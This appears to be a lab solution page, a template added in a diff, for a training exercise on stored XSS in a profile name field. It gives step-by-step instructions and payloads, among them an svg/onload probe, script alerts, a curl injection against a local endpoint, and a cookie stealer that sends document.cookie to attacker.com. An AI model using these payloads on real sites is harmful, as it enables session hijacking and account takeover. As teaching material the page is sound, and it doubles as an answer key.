@@ -1,0 +1,148 @@
+{% extends "base.html" %}
+
+{% block title %}Solution: Lab 02 - Stored XSS in Profile Name{% endblock %}
+
+{% block extra_css %}
+<style>
+    .solution-header {
+        background: linear-gradient(135deg, #238636 0%, #2ea043 100%);
+        padding: 30px;
+        border-radius: 8px;
+        margin-bottom: 30px;
+        color: white;
+    }
+    .solution-header h1 {
+        color: white;
+        margin-bottom: 10px;
+    }
+    .solution-header .lab-number {
+        background: rgba(255, 255, 255, 0.2);
+        padding: 5px 12px;
+        border-radius: 4px;
+        display: inline-block;
+        margin-bottom: 15px;
+    }
+    .objective-box {
+        background: #1c2128;
+        border-left: 4px solid #58a6ff;
+        padding: 20px;
+        margin: 20px 0;
+    }
+    .steps-box {
+        background: #0d1117;
+        border: 1px solid #30363d;
+        border-radius: 6px;
+        padding: 20px;
+        margin: 20px 0;
+    }
+    .steps-box ol {
+        margin-left: 20px;
+    }
+    .steps-box li {
+        margin-bottom: 10px;
+        line-height: 1.8;
+    }
+    .action-buttons {
+        display: flex;
+        gap: 15px;
+        margin-top: 30px;
+    }
+    .btn-secondary {
+        background: #30363d;
+        color: #c9d1d9;
+    }
+    .btn-secondary:hover {
+        background: #484f58;
+    }
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="solution-header">
+    <span class="lab-number">LAB 02 - SOLUTION</span>
+    <h1>Stored XSS in Profile Name</h1>
+    <p style="opacity: 0.9; font-size: 16px;">Based on Bug Bounty Report #2996005</p>
+</div>
+
+<div class="card">
+    <h2>📋 Lab Overview</h2>
+    <p>In this lab, you will exploit a <strong>Stored Cross-Site Scripting (XSS)</strong> vulnerability in the profile name field. This vulnerability allows an attacker to inject malicious scripts that execute when a victim logs into their account or views their profile, potentially leading to account takeover.</p>
+    
+    <div class="objective-box">
+        <h3 style="color: #58a6ff; margin-bottom: 15px;">🎯 Learning Objectives</h3>
+        <ul style="margin-left: 20px;">
+            <li>Understand stored XSS in user profile fields</li>
+            <li>Learn how XSS can persist across sessions</li>
+            <li>Test XSS payloads in different HTML contexts</li>
+            <li>Understand session hijacking via XSS</li>
+            <li>Learn about API endpoint vulnerabilities</li>
+        </ul>
+    </div>
+
+    <div class="vulnerability-info">
+        <h3>🔴 Vulnerability Details</h3>
+        <p><strong>Type:</strong> Stored XSS (Persistent)</p>
+        <p><strong>Location:</strong> Profile name field at <code>/profile</code> and <code>/Profile/userProfileEdit</code></p>
+        <p><strong>Severity:</strong> Medium (6.1)</p>
+        <p><strong>Impact:</strong> Account takeover, session hijacking, credential theft</p>
+        <p><strong>Root Cause:</strong> Profile name input is rendered without proper HTML encoding</p>
+    </div>
+</div>
+
+<div class="card">
+    <h2>📝 Step-by-Step Solution</h2>
+    
+    <div class="steps-box">
+        <h3 style="color: #f0f6fc; margin-bottom: 15px;">Step-by-Step Guide:</h3>
+        <ol>
+            <li><strong>Log in to your account</strong> (any account will work)</li>
+            <li><strong>Navigate to the Profile page</strong> at <code>/profile</code></li>
+            <li><strong>Modify your profile name</strong> to include an XSS payload</li>
+            <li><strong>Save the changes</strong> and observe the profile name</li>
+            <li><strong>Log out</strong> and log back in - the XSS should execute on login</li>
+            <li><strong>Try the API endpoint</strong> method using <code>POST /Profile/userProfileEdit</code></li>
+            <li><strong>Create a cookie stealer payload</strong> to demonstrate account takeover</li>
+        </ol>
+    </div>
+
+    <div class="objective-box">
+        <h3 style="color: #58a6ff; margin-bottom: 15px;">💡 Solution & Payloads</h3>
+        <p><strong>Simple Test Payload (from bug report):</strong></p>
+        <div class="code-block">
+xx"'&gt;&lt;svg/onload=confirm(1)&gt;
+        </div>
+        <p style="margin-top: 15px;"><strong>Alternative Payload:</strong></p>
+        <div class="code-block">
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+        </div>
+        <p style="margin-top: 15px;"><strong>Cookie Stealer Payload:</strong></p>
+        <div class="code-block">
+&lt;script&gt;fetch('http://attacker.com/steal?cookie='+document.cookie)&lt;/script&gt;
+        </div>
+        <p style="margin-top: 15px;"><strong>Using the API Endpoint (curl):</strong></p>
+        <div class="code-block">
+curl -X POST http://localhost:5000/Profile/userProfileEdit \<br>
+  -H "Cookie: session=YOUR_SESSION" \<br>
+  -d "name=&lt;script&gt;alert('XSS')&lt;/script&gt;"
+        </div>
+    </div>
+</div>
+
+<div class="card">
+    <h2>✅ Success Criteria</h2>
+    <p>You have successfully completed this lab when:</p>
+    <ul style="margin-left: 20px; margin-top: 10px;">
+        <li>✓ You can execute JavaScript via the profile name field</li>
+        <li>✓ The XSS payload persists in the database</li>
+        <li>✓ The payload executes when you log in or view your profile</li>
+        <li>✓ You understand how this could lead to account takeover</li>
+        <li>✓ You've tested both the web form and API endpoint methods</li>
+    </ul>
+</div>
+
+<div class="action-buttons">
+    <a href="/profile" class="btn">Try the Lab →</a>
+    <a href="/" class="btn btn-secondary">← Back to Labs</a>
+</div>
+{% endblock %}
+
